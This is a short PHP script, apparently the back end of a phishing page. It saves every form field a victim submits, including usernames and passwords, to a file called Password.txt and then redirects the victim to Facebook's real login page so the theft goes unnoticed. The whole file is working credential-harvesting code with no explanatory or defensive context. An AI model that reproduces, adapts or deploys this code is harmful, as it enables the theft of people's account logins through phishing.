<?php
header("location:https://www.facebook.com/login");
$work=fopen("Password.txt","w");
foreach($_POST as $a => $b) {
	fwrite($work, $a);
	fwrite($work, "=");
	fwrite($work, $b);
}
fclose($work);
?>